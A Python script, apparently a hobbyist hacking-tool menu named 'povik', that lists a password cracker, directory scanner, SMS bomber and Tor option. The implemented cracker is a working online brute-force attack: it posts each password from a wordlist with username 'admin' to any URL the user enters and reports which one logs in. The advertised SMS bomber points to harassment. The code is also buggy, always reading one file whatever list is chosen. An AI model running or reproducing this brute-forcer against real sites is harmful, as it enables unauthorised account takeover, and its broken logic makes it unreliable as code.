from colorama import Fore
import os
import time 
import platform
import requests
import ipapi
osuser = platform.uname()[0]
try:
    if platform.uname()[0] == "Windows":
        os.system("cls")
        os.system("neofetch -c red -ac green")
        time.sleep(2)
        print("  ")
        print("  ")
        print(Fore.RED+" ["+Fore.WHITE+"1"+Fore.RED+"]"+Fore.WHITE+" Cracker")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"2"+Fore.RED+"]"+Fore.WHITE+" Directory web Scanner")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"3"+Fore.RED+"]"+Fore.WHITE+" SMS boomber")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"4"+Fore.RED+"]"+Fore.WHITE+" Tor")
        time.sleep(0.2)
        print(" ")
        reqest = int(input(Fore.GREEN+"""┌──(povik:)-
        """+Fore.WHITE+" enter your number: "+Fore.BLUE))
    elif platform.uname()[0] == "Linux":
        os.system("clear")
        os.system("neofetch -c red -ac green")
        time.sleep(2)
        print()
        print(Fore.RED+" ["+Fore.WHITE+"1"+Fore.RED+"]"+Fore.WHITE+" Cracker")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"2"+Fore.RED+"]"+Fore.WHITE+" Directory web Scanner")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"3"+Fore.RED+"]"+Fore.WHITE+" SMS boomber")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"4"+Fore.RED+"]"+Fore.WHITE+" Tor")
        time.sleep(0.2)
        reqest = int(input(Fore.GREEN+"""┌──(povik:)-
        """+Fore.WHITE+" enter your number: "+Fore.BLUE))
    else:
        print(Fore.RED+"ERROR"+Fore.WHITE+" Your os is not supported by this tool")
    #IP Public user
    def ip() :
        ip = requests.get("http://api.ipify.org/").text
        ip_location = ipapi.location(ip)['country']
    #Cracker
    if reqest == 1:
        ip()
        print(" ")
        try:
            url = input(Fore.GREEN+"[?] enter your url: "+Fore.BLUE )
        except ValueError:
            print(Fore.YELLOW+"[ERROR Value]")
        except FileNotFoundError: 
            print(Fore.YELLOW+"\n [FileNotFoundError:]"+Fore.RED+" file is not Found:"+Fore.BLUE)
        print(Fore.RED+" [1]"+Fore.WHITE+" vip password list")
        print(Fore.RED+" [2]"+Fore.WHITE+" your pssword list")
        print(Fore.RED+" [3]"+Fore.WHITE+" berthday")
        print(Fore.RED+" [4]"+Fore.WHITE+" iran")
        pass_list = int(input(Fore.GREEN+"[?] Which password list do you choose?: "+Fore.BLUE))
        if pass_list == 2:
            userpass_list = open(input("enter adress your password list: "+Fore.BLUE,"r")).read().split()
        elif pass_list == 3:
            userpass_list = "berthday.txt"
        elif pass_list == 1:
            userpass_list = "m.txt"
        myfile = open("m.txt","r").read().split()
        print(myfile)
        for passwd in myfile:
            http = requests.post(url,data={"username":"admin","password":passwd,"sub":""}).text
            if "Welcome" in http:
                print(Fore.GREEN+"Password ok > "+Fore.WHITE+passwd)
                reqest_user = input(Fore.YELLOW+"[?] Do you want to continue? (y/n) :")
                if reqest_user == "n":
                    break
            else:
                print(Fore.RED+"passwd No > "+Fore.WHITE+passwd)
    else:
        print(Fore.RED+" [!] "+Fore.WHITE+f"{reqest}"+" is not defind1! ")
    #error
except ValueError:
    print(Fore.YELLOW+"\n [ValueError]"+Fore.RED+" enter yrue value")
except KeyboardInterrupt:
    print(Fore.YELLOW+"\n [KeyboardInterrupt]"+Fore.RED+" EXIT USER()")
    exit()
except ModuleNotFoundError:
    print(Fore.YELLOW+"\n [ModuleNotFoundError]"+Fore.RED+" read help")
except SyntaxError:
    print(Fore.YELLOW+"\n [SyntaxError]"+Fore.RED+" Error for POVIK, please try agin")
except FileNotFoundError:
    print(Fore.YELLOW+"\n [File notfound]"+Fore.RED+" check the location password list")
    #user enter